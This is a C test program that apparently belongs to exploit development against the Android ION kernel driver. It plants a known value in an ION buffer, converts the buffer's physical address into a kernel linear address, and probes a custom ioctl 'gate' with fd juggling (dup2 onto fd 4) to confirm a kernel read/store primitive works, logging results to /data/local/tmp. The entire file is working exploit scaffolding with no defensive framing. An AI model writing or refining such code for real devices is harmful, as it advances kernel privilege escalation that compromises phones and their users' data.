/* Verify the narrowed gate: plant the value 4 in a buffer we own, then ask the gate
 * about that buffer's physical address. If the gate does not pass, the narrowing is
 * broken and any "0 stores" result is meaningless. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;
#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };
#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)
struct ion_sync_range_data { s32 fd; u32 offset, size, note; };
#define ION_IOC_SYNC_RANGE _IOWR(ION_TYPE, 11, struct ion_sync_range_data)

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define ION_SLOT 3000

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[300]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk(int *h, int *f, u32 *iv){
    struct ion_allocation_data a; memset(&a,0,sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d,0,sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    struct ion_phys_data p; memset(&p,0,sizeof p); p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
    if (ioctl(ionfd, ION_IOC_PHYS, &p) < 0) return 0;
    *h = a.handle; *f = d.fd; *iv = p.addr;
    return 1;
}
int main(void){
    LOG = fopen("/data/local/tmp/gtest.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("gtest uid=%d\n", getuid());
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE,&rl)==0){ rl.rlim_cur=rl.rlim_max; setrlimit(RLIMIT_NOFILE,&rl); }
    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0){ say("open: %d\n", errno); return 0; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);
    say("ionfd=%d\n", ionfd);

    /* two buffers: one for the planted value, one to become the class fd */
    int h1,f1,h2,f2; u32 iv1=0, iv2=0;
    if (!mk(&h1,&f1,&iv1) || !mk(&h2,&f2,&iv2)){ say("alloc failed\n"); return 0; }
    say("buf1 fd=%d iova=0x%08x ; buf2 fd=%d iova=0x%08x\n", f1, iv1, f2, iv2);

    /* map buf1 and write 4 into it */
    u8 *m = mmap(NULL, PGSZ, PROT_READ|PROT_WRITE, MAP_SHARED, f1, 0);
    if (m == MAP_FAILED){ say("mmap: %d\n", errno); return 0; }
    memset(m, 0, PGSZ);
    u32 four = 4;
    memcpy(m, &four, 4);
    /* cache maintenance so the kernel's view matches */
    struct ion_sync_range_data sr; memset(&sr,0,sizeof sr);
    sr.fd = f1; sr.size = PGSZ; sr.note = 4;
    ioctl(ionfd, ION_IOC_SYNC_RANGE, &sr);

    u64 lin = (u64)PAGE_OFFSET_V + iv1 - MEMSTART;
    say("planted 4 at linear 0x%llx\n", (unsigned long long)lin);

    /* case 1: fd 4 is NOT a dmabuf -> the gate should test against nothing */
    say("case 1: fd4 free -> gate(+0)=%d (expect fail)\n", gate(lin));
    say("case 1: gate(+8)=%d (expect fail)\n", gate(lin + 8));

    /* case 2: fd 4 = buf2, and the planted word is 4 */
    if (dup2(f2, 4) < 0){ say("dup2: %d\n", errno); return 0; }
    say("case 2: fd4=buf2 -> gate(+0)=%d (word is 4, expect PASS)\n", gate(lin));
    *(u32*)(m + 8) = 9; ioctl(ionfd, ION_IOC_SYNC_RANGE, &sr);
    say("case 2: after writing 9 at +8: gate(+8)=%d (expect fail)\n", gate(lin + 8));
    *(u32*)(m + 8) = 4; ioctl(ionfd, ION_IOC_SYNC_RANGE, &sr);
    say("case 2: after writing 4 at +8: gate(+8)=%d (expect PASS)\n", gate(lin + 8));

    /* case 3: what did the store put at +12? */
    u32 a12 = 0; memcpy(&a12, m + 12, 4);
    say("case 3: word at +12 after the store = 0x%08x (expect 0x%08x from buf2)\n",
        a12, iv2);
    say("GATEDONE\n");
    fclose(LOG);
    return 0;
}
